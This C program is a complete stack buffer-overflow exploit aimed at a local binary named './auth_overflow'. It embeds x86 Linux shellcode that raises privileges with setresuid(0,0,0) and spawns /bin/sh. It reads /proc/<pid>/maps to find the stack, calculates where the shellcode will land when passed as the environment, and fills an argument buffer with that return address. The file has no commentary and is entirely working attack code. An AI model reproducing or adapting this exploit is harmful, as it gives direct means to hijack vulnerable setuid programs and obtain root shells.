#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51"
  "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd"
  "\x80";

unsigned int getbaseaddr(int pid) {
  char fileName[20];
  memset(fileName, 0, 20);
  snprintf(fileName, 20, "/proc/%d/maps", pid);

  FILE *fp = fopen(fileName, "r");
  if (fp == NULL) {
    exit(1);
  }

  char *line = NULL;
  size_t len = 0;
  char *addr = (char*)malloc(100);
  int found = 0;
  while (getline(&line, &len, fp) != -1 && !found) {
    char *token;
    token = strsep(&line, " ");
    memset(addr, 0, 100);
    strcat(addr, token);
    while ((token = strsep(&line, " ")) != NULL) {
      if (strcmp(token, "[stack]") == 0) {
        found = 1;
      }
    }
  }

  char *sbaseaddr;
  strsep(&addr, "-");
  sbaseaddr = strsep(&addr, "-");
  unsigned int baseaddr = (unsigned int)strtoul(sbaseaddr, NULL, 16);  
  free(addr);

  return baseaddr;
}

int main(int argc, char *argv[]) {
  char *env[2] = {shellcode, 0};
  unsigned int i, ret;

  char *buffer = (char *)malloc(160);

  ret = getbaseaddr(getpid()) - 8 - sizeof(shellcode) -
    strlen("./auth_overflow") - 1;

  for (i = 0; i < 160; i += 4)
    *((unsigned int *)(buffer + i)) = ret;

  execle("./auth_overflow", "auth_overflow", buffer, (char *)NULL, env);
  free(buffer);
}
